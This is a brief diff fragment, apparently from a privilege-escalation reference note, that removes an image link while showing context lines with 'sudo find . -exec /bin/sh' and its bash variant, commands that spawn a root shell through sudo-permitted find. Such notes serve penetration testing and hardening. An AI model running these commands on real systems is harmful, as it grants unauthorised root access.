@@ -15,5 +15,3 @@ sudo find . -exec /bin/sh \; -quit
 # or
 sudo find . -exec /bin/bash \; -quit
 ```
-
-![image](https://github.com/user-attachments/assets/9dc0ab1f-6f02-4863-981f-f2ffd43b0e3f)
